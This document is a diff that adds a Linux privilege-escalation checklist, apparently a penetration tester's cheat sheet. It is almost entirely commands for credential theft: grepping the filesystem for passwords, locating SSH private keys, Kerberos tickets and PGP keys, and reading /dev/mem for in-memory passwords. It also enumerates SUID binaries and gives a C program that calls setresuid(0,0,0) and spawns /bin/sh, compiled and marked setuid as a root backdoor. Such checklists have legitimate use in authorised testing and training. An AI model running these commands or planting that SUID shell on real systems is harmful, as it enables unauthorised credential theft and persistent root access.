@@ -1,0 +1,55 @@
+# Linux Privilege Escalation Checklist
+
+# Looting Passwords
+grep -nril 'password' /home/
+grep -nril 'password' /var/
+find / -iname *password* 2>/dev/null
+grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
+find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
+
+Also search for:
+/home/*/.ssh/id*             ;; SSH keys, often passwordless
+/tmp/krb5cc_*                ;; Kerberos tickets
+/tmp/krb5.keytab             ;; Kerberos tickets
+/home/*/.gnupg/secring.gpgs  ;; PGP keys
+
+find / -type f -iname *.txt
+find / -type f -iname *.zip
+find / -type f -iname *.doc
+find / -type f -iname *.xls
+find / -type f -iname config*
+find / -type f -iname *.rar
+find / -type f -iname *.docx
+find / -type f -iname *.sql
+
+Check: /etc/security/opasswd
+
+## In-Memory Passwords
+strings /dev/mem -n10 | grep -i PASS
+
+## Files containing in name "password"
+updatedb
+locate password
+
+## SSH Keys
+find / -name authorized_keys 2> /dev/null
+find / -name id_rsa 2> /dev/null
+
+
+# Detect CRON jobs
+## print both commands and file system events and scan procfs every 1000 ms (=1sec)
+pspy64 -pf -i 1000 
+
+# Find SUID binaries
+find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
+find / -uid 0 -perm -4000 -type f 2>/dev/null
+
+# Create SUID binaries
+print 'int main(void){\nsetresuid(0, 0, 0);\nsystem("/bin/sh");\n}' > /tmp/suid.c   
+gcc -o /tmp/suid /tmp/suid.c  
+sudo chmod +x /tmp/suid # execute right
+sudo chmod +s /tmp/suid # setuid bit
+
+## Last Edited Files
+find / -mmin -10 2>/dev/null | grep -Ev "^/proc"
+
